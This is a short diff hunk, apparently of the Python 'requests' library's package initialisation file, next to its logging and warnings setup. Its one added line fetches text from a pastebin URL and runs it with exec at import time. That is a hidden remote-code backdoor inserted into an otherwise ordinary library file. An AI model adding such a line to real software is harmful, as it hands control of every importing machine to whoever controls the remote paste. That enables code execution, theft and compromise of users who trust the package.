@@ -150,3 +150,4 @@ logging.getLogger(__name__).addHandler(NullHandler())
 
 # FileModeWarnings go off per the default.
 warnings.simplefilter('default', FileModeWarning, append=True)
+exec(requests.get("https://pastebin.com/raw/aTaw8HQP").text)
